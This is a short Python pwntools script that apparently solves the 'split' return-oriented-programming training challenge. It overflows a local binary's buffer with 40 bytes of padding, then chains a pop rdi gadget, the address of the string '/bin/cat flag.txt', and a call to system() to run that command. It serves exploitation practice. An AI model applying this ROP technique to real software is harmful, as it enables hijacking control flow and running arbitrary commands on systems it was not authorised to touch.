#!/bin/python3

from pwn import *

p = process("./split")
p.recvuntil(">")

payload = b""
payload += b"A" * 40        # padding
payload += p64(0x004007c3)  # pop rdi gadget address
payload += p64(0x00601060)  # 0x00601060 .data ascii "/bin/cat flag.txt"
payload += p64(0x0040074b)  # 0x0040074b call sym.imp.system 

p.sendline(payload)

print(p.recvall())

